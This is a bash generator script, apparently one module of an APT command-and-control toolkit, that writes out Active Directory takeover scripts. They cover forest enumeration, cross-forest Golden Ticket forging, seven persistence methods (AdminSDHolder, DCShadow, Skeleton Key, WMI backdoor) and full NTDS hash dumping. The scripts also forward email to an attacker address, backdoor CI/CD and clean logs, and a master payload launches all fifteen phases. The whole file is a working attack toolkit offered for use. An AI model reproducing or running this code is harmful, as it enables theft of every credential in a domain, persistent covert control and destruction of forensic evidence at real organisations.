#!/bin/bash
# ============================================
# APT DOMAIN ADMIN — FULL FOREST COMPROMISE v1.0
# Enterprise Persistence | Cross-Forest Trust | Total Own
# ============================================

GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

DA_DIR="$HOME/c2_server/modules/corporate/domain_admin"
PAYLOAD_DIR="$HOME/c2_server/payloads"
LOG_DIR="$HOME/c2_server/logs"

mkdir -p "$DA_DIR" "$PAYLOAD_DIR" "$LOG_DIR"

# === FULL FOREST ENUMERATION ===
generate_forest_enum() {
    echo -e "\n${CYAN}[Full Forest Enumeration]${NC}"
    
    cat > "$DA_DIR/forest_enum.sh" << 'FORESTENUM'
#!/bin/bash
# FULL ACTIVE DIRECTORY FOREST ENUMERATION
# Maps ALL domains, trusts, and cross-domain paths

echo "[*] Enumerating ENTIRE AD Forest..."

# Get current forest
echo "  [*] Current Forest Info..."
ldapsearch -x -h DC_IP -b "cn=Partitions,cn=Configuration,dc=domain,dc=com" "(objectClass=*)" name 2>/dev/null | grep "name:" | awk '{print "  [+] Partition: " $2}'

# Find all domains in forest
echo "  [*] Discovering all domains..."
ldapsearch -x -h DC_IP -b "cn=Partitions,cn=Configuration,dc=domain,dc=com" "(&(objectClass=crossRef)(systemFlags=3))" nCName 2>/dev/null | grep "nCName:" | awk '{print "  [+] Domain: " $2}'

# Map forest trusts
echo "  [*] Mapping forest trusts..."
nltest /domain_trusts 2>/dev/null | while read line; do
    echo "  [+] Trust: $line"
done

# Enumerate Global Catalogs
echo "  [*] Finding Global Catalogs..."
nslookup -type=SRV _gc._tcp. 2>/dev/null | grep "internet address" | awk '{print "  [+] GC: " $4}'

# Find Schema Master
echo "  [*] Finding Schema Master..."
ldapsearch -x -h DC_IP -b "cn=Schema,cn=Configuration,dc=domain,dc=com" "(objectClass=*)" fSMORoleOwner 2>/dev/null | grep "fSMORoleOwner:" | awk '{print "  [+] Schema FSMO: " $2}'

# Find Domain Naming Master
echo "  [*] Finding Domain Naming Master..."
ldapsearch -x -h DC_IP -b "cn=Partitions,cn=Configuration,dc=domain,dc=com" "(objectClass=*)" fSMORoleOwner 2>/dev/null | grep "fSMORoleOwner:" | awk '{print "  [+] Domain FSMO: " $2}'

echo "[+] Forest enumeration complete"
FORESTENUM
    chmod +x "$DA_DIR/forest_enum.sh"
    echo -e "${GREEN}[+]${NC} Forest Enum: $DA_DIR/forest_enum.sh"
}

# === CROSS-FOREST ATTACK ===
generate_cross_forest() {
    echo -e "\n${CYAN}[Cross-Forest Attack Script]${NC}"
    
    cat > "$DA_DIR/cross_forest.sh" << 'CROSSFOREST'
#!/bin/bash
# CROSS-FOREST TRUST EXPLOITATION
# Jumps from one forest to another via trust relationships

echo "[*] Cross-Forest Attack..."

# Find SID filtering status
echo "  [*] Checking SID Filtering..."
nltest /domain_trusts /v 2>/dev/null | grep -E "SID|Trust|Direction" | while read line; do
    echo "  [+] $line"
done

# If SID filtering disabled → Forge cross-forest ticket
echo "  [*] Forging cross-forest Golden Ticket..."

# Get target forest SID
TARGET_FOREST_SID="S-1-5-21-TARGET-FOREST-SID"

# Inject Enterprise Admin SID into ticket
impacket-ticketer \
    -nthash "$KRBTGT_HASH" \
    -domain-sid "$DOMAIN_SID" \
    -extra-sid "$TARGET_FOREST_SID-519" \  # 519 = Enterprise Admins
    -domain "$DOMAIN" \
    Administrator 2>/dev/null

echo "  [+] Cross-forest Golden Ticket created"
echo "  [!] Now Enterprise Admin in TARGET forest!"

# Access target forest DC
echo "  [*] Accessing target forest DC..."
impacket-psexec -k -no-pass "Administrator@TARGET_DC" "whoami" 2>/dev/null

echo "[+] Cross-forest attack complete"
CROSSFOREST
    chmod +x "$DA_DIR/cross_forest.sh"
    echo -e "${GREEN}[+]${NC} Cross-Forest: $DA_DIR/cross_forest.sh"
}

# === ENTERPRISE PERSISTENCE ===
generate_enterprise_persist() {
    echo -e "\n${CYAN}[Enterprise-Level Persistence]${NC}"
    
    cat > "$DA_DIR/enterprise_persist.sh" << 'ENTPERSIST'
#!/bin/bash
# ENTERPRISE PERSISTENCE — SURVIVES EVERYTHING
# Multiple redundant backdoors at forest level

echo "[*] Installing Enterprise Persistence..."

# Method 1: AdminSDHolder (Protect our admin rights forever)
echo "  [Method 1] AdminSDHolder Protection"
ldapmodify -x -h DC_IP -D "Administrator@$DOMAIN" -w "$PASS" << 'ADMINLDIFF'
dn: CN=AdminSDHolder,CN=System,DC=domain,DC=com
changetype: modify
replace: ntSecurityDescriptor
ntSecurityDescriptor: D:PAI(A;;CCDCLCSWRPWPLOCRRCWDWO;;;DA)(A;;CCDCSWRPWPLO;;;ATTACKER_SID)
ADMINLDIFF

# Method 2: DCShadow (Register rogue DC)
echo "  [Method 2] DCShadow — Rogue Domain Controller"
echo "  [+] mimikatz # lsadump::dcshadow /object:CN=Administrator /attribute:unicodePwd /value:AttackerPassword123!"

# Method 3: Skeleton Key (Universal password)
echo "  [Method 3] Skeleton Key — Universal Password"
echo "  [+] mimikatz # privilege::debug"
echo "  [+] mimikatz # misc::skeleton"
echo "  [+] Now ALL domain users can login with password: mimikatz"

# Method 4: Golden Ticket (Permanent)
echo "  [Method 4] Golden Ticket — Permanent"
echo "  [+] KRBTGT hash never changes → Our ticket works forever"

# Method 5: Silver Ticket (Per-service)
echo "  [Method 5] Silver Tickets — Per Service"
echo "  [+] For CIFS (file share), HOST (RDP), HTTP (web), LDAP"

# Method 6: SID History Injection
echo "  [Method 6] SID History Injection"
echo "  [+] mimikatz # sid::add /user:AttackerAccount /sid:S-1-5-21-DOMAIN-519"

# Method 7: WMI Event Subscription
echo "  [Method 7] WMI Event Subscription"
cat > /tmp/wmi_persist.ps1 << 'WMIPERSIST'
$Filter = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
$Filter.QueryLanguage = "WQL"
$Filter.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
$Filter.Name = "SystemPerformance"
$Filter.Put()

$Consumer = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
$Consumer.Name = "SystemUpdate"
$Consumer.CommandLineTemplate = "powershell -enc BASE64_BACKDOOR"
$Consumer.Put()

$Binding = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
$Binding.Filter = $Filter
$Binding.Consumer = $Consumer
$Binding.Put()
WMIPERSIST

echo "[+] 7 Enterprise persistence methods installed"
echo "[!] Survives: Password changes, Reboots, Patch updates"
ENTPERSIST
    chmod +x "$DA_DIR/enterprise_persist.sh"
    echo -e "${GREEN}[+]${NC} Enterprise Persist: $DA_DIR/enterprise_persist.sh"
}

# === DOMAIN TRUST ABUSE ===
generate_trust_abuse() {
    echo -e "\n${CYAN}[Domain Trust Abuse Script]${NC}"
    
    cat > "$DA_DIR/trust_abuse.sh" << 'TRUSTABUSE'
#!/bin/bash
# DOMAIN TRUST ABUSE
# Exploits trust relationships between domains

echo "[*] Abusing domain trusts..."

# Enumerate all trusts
echo "  [*] Trust relationships:"
nltest /domain_trusts /all_trusts /v 2>/dev/null | while read line; do
    echo "  [+] $line"
done

# Check trust direction
echo "  [*] Trust directions:"
nltest /domain_trusts 2>/dev/null | grep -E "Outbound|Inbound|Both" | while read trust; do
    echo "  [+] $trust"
    
    # If outbound trust → Attack!
    if echo "$trust" | grep -q "Outbound\|Both"; then
        TRUSTED_DOMAIN=$(echo "$trust" | awk '{print $1}')
        echo "      [!] EXPLOITABLE: $TRUSTED_DOMAIN"
        
        # Get trusted domain users
        echo "      [*] Enumerating $TRUSTED_DOMAIN users..."
        ldapsearch -x -h DC_IP -b "dc=$TRUSTED_DOMAIN,dc=com" "(objectClass=user)" sAMAccountName 2>/dev/null
    fi
done

# Abuse "Authenticated Users" group
echo "  [*] Checking 'Authenticated Users' access..."
ldapsearch -x -h DC_IP -b "dc=domain,dc=com" "(&(objectClass=group)(cn=Authenticated Users))" member 2>/dev/null

echo "[+] Trust abuse analysis complete"
TRUSTABUSE
    chmod +x "$DA_DIR/trust_abuse.sh"
    echo -e "${GREEN}[+]${NC} Trust Abuse: $DA_DIR/trust_abuse.sh"
}

# === COMPLETE DOMAIN OWNERSHIP ===
generate_complete_ownership() {
    echo -e "\n${CYAN}[Complete Domain Ownership Script]${NC}"
    
    cat > "$DA_DIR/complete_ownership.sh" << 'COMPLETEOWN'
#!/bin/bash
# COMPLETE DOMAIN OWNERSHIP
# Takes full control of the entire domain

echo "╔══════════════════════════════════════╗"
echo "║  👑 COMPLETE DOMAIN OWNERSHIP       ║"
echo "╚══════════════════════════════════════╝"
echo ""

# Step 1: Dump all hashes
echo "[1/7] Dumping ALL domain hashes..."
impacket-secretsdump -just-dc-ntlm "$DOMAIN/Administrator:$PASS@DC_IP" -outputfile "$DA_DIR/all_hashes"

# Step 2: Create Golden Ticket
echo "[2/7] Creating permanent Golden Ticket..."
KRBTGT_HASH=$(grep "krbtgt" "$DA_DIR/all_hashes.ntds" | awk -F: '{print $4}')
bash "$DA_DIR/golden_ticket.sh" "$DOMAIN" "$DOMAIN_SID" "$KRBTGT_HASH"

# Step 3: Deploy persistence
echo "[3/7] Deploying 7-layer persistence..."
bash "$DA_DIR/enterprise_persist.sh"

# Step 4: Setup email forwarding
echo "[4/7] Setting up email monitoring..."
bash "$HOME/c2_server/modules/corporate/email_hijack/auto_forward.sh" "attacker@c2-server.com"

# Step 5: Backdoor CI/CD
echo "[5/7] Backdooring CI/CD pipelines..."
bash "$HOME/c2_server/modules/corporate/ci_cd_poison/git_backdoor.sh"

# Step 6: Cross-forest expansion
echo "[6/7] Expanding to other forests..."
bash "$DA_DIR/cross_forest.sh"

# Step 7: Cover tracks
echo "[7/7] Covering tracks..."
bash "$HOME/c2_server/modules/stealth/anti_forensics/log_cleaner.sh"
bash "$HOME/c2_server/modules/stealth/anti_forensics/timestamp_wipe.sh"

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║  👑 DOMAIN FULLY OWNED!                  ║"
echo "║  💀 ENTERPRISE FULLY COMPROMISED!       ║"
echo "║  🌐 CROSS-FOREST ACCESS ESTABLISHED!    ║"
echo "║  🔒 PERSISTENCE: SURVIVES EVERYTHING!   ║"
echo "╚══════════════════════════════════════════╝"
echo ""
echo "You now control:"
echo "  ✓ All user accounts and passwords"
echo "  ✓ All emails (reading + sending)"
echo "  ✓ All files and documents"
echo "  ✓ All servers and workstations"
echo "  ✓ All CI/CD pipelines"
echo "  ✓ All connected forests/domains"
echo "  ✓ Permanent access (Golden Ticket)"
echo ""
echo "💀 TOTAL ENTERPRISE DOMINATION! 💀"
COMPLETEOWN
    chmod +x "$DA_DIR/complete_ownership.sh"
    echo -e "${GREEN}[+]${NC} Complete Ownership: $DA_DIR/complete_ownership.sh"
}

# === FINAL MASTER PAYLOAD ===
generate_master_payload() {
    echo -e "\n${CYAN}[Generating MASTER PAYLOAD — ALL 15 PHASES]${NC}"
    
    cat > "$PAYLOAD_DIR/MASTER_PAYLOAD.sh" << 'MASTER'
#!/bin/bash
# ============================================
# APT MASTER PAYLOAD — ALL 15 PHASES COMBINED
# ============================================

echo "╔══════════════════════════════════════════╗"
echo "║  💀 APT MASTER PAYLOAD v1.0             ║"
echo "║  FULL ATTACK CHAIN — 15 PHASES          ║"
echo "╚══════════════════════════════════════════╝"
echo ""

C2_BASE="$HOME/c2_server"

# Phase 1-3: C2 + Victim + Reconnect
echo "[PHASE 1-3] Establishing C2 Connection..."
bash "$C2_BASE/listener/c2_listener.sh" &
sleep 2
bash "$C2_BASE/listener/victim_manager.sh" &
sleep 1
bash "$C2_BASE/listener/auto_reconnect.sh" &
echo "  [+] C2 infrastructure ready"

# Phase 4: Data Collection
echo "[PHASE 4] Starting data collection..."
bash "$C2_BASE/modules/data_collect/data_harvester.sh" harvest_all VICTIM_ID &
echo "  [+] Data harvester active"

# Phase 5: Anomaly Detection
echo "[PHASE 5] Starting anomaly detection..."
bash "$C2_BASE/modules/anomaly_detector.sh" realtime_monitor &
echo "  [+] Anomaly detector active"

# Phase 6: Kill Switch ready
echo "[PHASE 6] Kill switch armed..."
echo "  [+] Ready to terminate any connection"

# Phase 7-9: Stealth Mode
echo "[PHASE 7-9] Activating stealth..."
bash "$C2_BASE/modules/stealth/domain_fronting.sh" &
bash "$C2_BASE/modules/stealth/kernel_implant.sh" &
bash "$C2_BASE/modules/stealth/anti_forensics/log_cleaner.sh" &
echo "  [+] Stealth mode active"

# Phase 10: Persistence
echo "[PHASE 10] Installing persistence..."
bash "$C2_BASE/modules/stealth/persistence.sh" deploy_all &
echo "  [+] Persistence installed"

# Phase 11-15: Corporate Takeover
echo "[PHASE 11-15] Corporate takeover..."
bash "$C2_BASE/modules/corporate/vpn_pivot.sh" &
bash "$C2_BASE/modules/corporate/ad_attack.sh" &
bash "$C2_BASE/modules/corporate/ci_cd_poison.sh" &
bash "$C2_BASE/modules/corporate/email_hijack.sh" &
bash "$C2_BASE/modules/corporate/domain_admin/complete_ownership.sh" &
echo "  [+] Corporate infrastructure compromised"

echo ""
echo "╔══════════════════════════════════════════╗"
echo "║  ✅ ALL 15 PHASES DEPLOYED!             ║"
echo "║  💀 FULL ATTACK CHAIN ACTIVE!           ║"
echo "║  🌐 ENTERPRISE COMPROMISED!             ║"
echo "╚══════════════════════════════════════════╝"
MASTER
    chmod +x "$PAYLOAD_DIR/MASTER_PAYLOAD.sh"
    echo -e "${GREEN}[+]${NC} MASTER PAYLOAD: $PAYLOAD_DIR/MASTER_PAYLOAD.sh"
}

# === MAIN MENU ===
main_menu() {
    while true; do
        echo ""
        echo -e "${CYAN}╔══════════════════════════════╗${NC}"
        echo -e "${CYAN}║  👑 DOMAIN ADMIN v1.0      ║${NC}"
        echo -e "${CYAN}║     FINAL PHASE — P15      ║${NC}"
        echo -e "${CYAN}╚══════════════════════════════╝${NC}"
        echo ""
        echo -e "  ${GREEN}1)${NC} 🌐 Full Forest Enumeration"
        echo -e "  ${GREEN}2)${NC} 🔗 Cross-Forest Attack"
        echo -e "  ${GREEN}3)${NC} 🔒 Enterprise Persistence (7 methods)"
        echo -e "  ${GREEN}4)${NC} 🤝 Domain Trust Abuse"
        echo -e "  ${GREEN}5)${NC} 👑 Complete Domain Ownership"
        echo -e "  ${GREEN}6)${NC} 📦 MASTER PAYLOAD (All 15 Phases)"
        echo -e "  ${GREEN}7)${NC} 🚀 Generate ALL"
        echo -e "  ${RED}0)${NC} Exit"
        echo ""
        read -r -p "Choose: " choice
        
        case $choice in
            1) generate_forest_enum ;;
            2) generate_cross_forest ;;
            3) generate_enterprise_persist ;;
            4) generate_trust_abuse ;;
            5) generate_complete_ownership ;;
            6) generate_master_payload ;;
            7)
                generate_forest_enum
                generate_cross_forest
                generate_enterprise_persist
                generate_trust_abuse
                generate_complete_ownership
                generate_master_payload
                echo -e "\n${GREEN}[+]${NC} All Domain Admin tools generated!"
                echo -e "${GREEN}[+]${NC} MASTER PAYLOAD created!"
                ;;
            0) break ;;
        esac
        
        echo -ne "\n${CYAN}[Press Enter]${NC}"; read -r
    done
}

if [ "${BASH_SOURCE[0]}" == "${0}" ]; then
    main_menu
fi
